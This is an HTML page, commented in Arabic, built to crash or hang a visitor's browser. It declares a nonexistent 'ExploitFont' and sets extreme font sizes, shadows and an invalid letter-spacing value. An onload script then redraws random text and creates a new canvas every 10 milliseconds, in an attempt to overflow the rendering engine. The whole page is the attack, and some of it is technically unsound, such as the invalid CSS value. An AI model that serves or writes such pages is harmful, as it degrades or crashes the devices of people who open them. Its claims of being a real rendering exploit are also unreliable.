<!DOCTYPE html>
<html>
<head>
    <style>
        /* 1. نقوم بتعريف خط وهمي ونعطيه مساراً غير موجود */
        @font-face {
            font-family: 'ExploitFont';
            src: url('non_existent_font.ttf');
        }

        /* 2. نطبق خصائص غريبة جداً تجبر النظام على حسابات معقدة */
        .crash-text {
            font-family: 'ExploitFont', sans-serif;
            font-size: 1000px; /* حجم ضخم جداً */
            letter-spacing: 0xFFFFFFFF; /* مسافات غير منطقية */
            text-shadow: 100px 100px 100px red;
        }
    </style>
</head>
<body onload="trigger()">
    <div id="target" class="crash-text">TESTING SYSTEM...</div>

    <script>
        function trigger() {
            let target = document.getElementById('target');
            
            // 3. تكرار تغيير محتوى النص بسرعة لإجبار المحرك على إعادة الرسم (Re-rendering)
            setInterval(() => {
                target.innerHTML = Math.random().toString(36);
                
                // محاولة إحداث Overflow أثناء الرسم
                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                ctx.font = "1000px ExploitFont";
                ctx.fillText("CRASHING...", 10, 50);
            }, 10);
        }
    </script>
</body>
</html>
